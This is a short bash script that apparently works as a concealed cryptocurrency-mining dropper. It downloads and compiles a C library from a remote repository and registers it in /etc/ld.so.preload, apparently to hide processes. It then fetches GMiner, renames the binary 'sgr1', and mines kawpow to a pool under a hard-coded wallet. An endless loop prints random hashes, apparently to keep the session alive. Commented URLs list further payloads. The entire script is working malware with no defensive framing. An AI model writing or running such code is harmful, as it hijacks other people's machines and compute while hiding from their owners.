#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
# https://github.com/barburonjilo/back/raw/main/sr srb

wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz && tar -xvf gminer_3_44_linux64.tar.xz && mv miner sgr1
./sgr1 -a kawpow -s stratum-asia.rplant.xyz:17049 --ssl -u DrYNNvx6sb2kGdJnmXFE3DYHC1iouR8X9F.tes &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
